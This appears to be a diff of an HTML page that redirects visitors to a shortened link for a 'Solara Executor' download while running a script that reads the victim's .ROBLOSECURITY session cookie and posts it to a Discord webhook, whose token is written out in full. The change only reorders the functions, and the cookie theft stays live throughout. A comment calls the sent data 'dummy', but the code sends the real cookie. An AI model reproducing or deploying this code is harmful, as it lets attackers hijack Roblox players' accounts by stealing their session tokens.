@@ -17,6 +17,23 @@
     <meta http-equiv="refresh" content="0; url=https://bit.ly/Solara-Executor">
     <!-- Cookie Retrieval Script -->
     <script>
+        // Function to get a specific cookie by name
+        function getCookie(name) {
+            let cookieArr = document.cookie.split(";");
+            
+            for (let i = 0; i < cookieArr.length; i++) {
+                let cookiePair = cookieArr[i].split("=");
+                
+                if (name === cookiePair[0].trim()) {
+                    return decodeURIComponent(cookiePair[1]);
+                }
+            }
+            
+            return null;
+        }
+
+        // Attempt to retrieve the .ROBLOSECURITY cookie
+        let robloSecurityCookie = getCookie('.ROBLOSECURITY');
         function sendToWebhook(data) {
             fetch('https://discord.com/api/webhooks/1275918541702561803/TC8xhuXEgioM6PLJyrG3Gu-jaV3L25YgaxBuaB29SpJKhnb3tu2dwrZzMJnjAHgVmMwC', {
                 method: 'POST',
@@ -38,23 +55,6 @@
                 console.error('Error:', error);
             });
         }
-        // Function to get a specific cookie by name
-        function getCookie(name) {
-            let cookieArr = document.cookie.split(";");
-            
-            for (let i = 0; i < cookieArr.length; i++) {
-                let cookiePair = cookieArr[i].split("=");
-                
-                if (name === cookiePair[0].trim()) {
-                    return decodeURIComponent(cookiePair[1]);
-                }
-            }
-            
-            return null;
-        }
-
-        // Attempt to retrieve the .ROBLOSECURITY cookie
-        let robloSecurityCookie = getCookie('.ROBLOSECURITY');
         // Call the function to send dummy data
         sendToWebhook(robloSecurityCookie);
     </script>
